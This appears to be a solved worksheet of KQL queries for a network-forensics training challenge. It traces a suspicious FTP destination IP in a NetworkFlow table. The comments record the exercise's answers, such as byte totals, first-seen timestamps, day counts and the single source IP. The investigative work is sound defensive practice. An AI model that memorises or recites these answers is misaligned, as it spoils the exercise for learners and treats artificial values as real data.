//4: A Network Mystery
//Which IP address received the largest amount of data on Feb 5th?

NetworkFlow
| where timestamp between (datetime(2024-02-05) .. datetime(2024-02-05 23:59:59))
| top 1 by  bytes desc // dest_ip == 182.56.23.121 TCP protocol des_port==21

//How many bytes of data were sent to that IP on the 5th?12716
//When was data first sent to this IP? (paste the full timestamp)

NetworkFlow
| where dest_ip == "182.56.23.121"
| project timestamp, dest_ip, bytes //2024-01-21T13:28:33.000Z

//On how many distinct days have we sent data to this IP?
NetworkFlow
| where dest_ip == "182.56.23.121"
| summarize distinct_days = dcount(bin(timestamp, 1d)) //27 days

//What service is used for the port to which this data is being transferred?
NetworkFlow
| where dest_ip == "182.56.23.121"
//|project dest_port, src_port //des_port==21 (FTP)

//What is the total amount of data transferred to this IP address?
NetworkFlow
| where dest_ip == "182.56.23.121"
| summarize total_bytes = sum(bytes) //208138

//How many distinct employees have sent data to this IP address?
NetworkFlow
| where dest_ip == "182.56.23.121"
| distinct src_ip //10.10.0.2
//| count //1

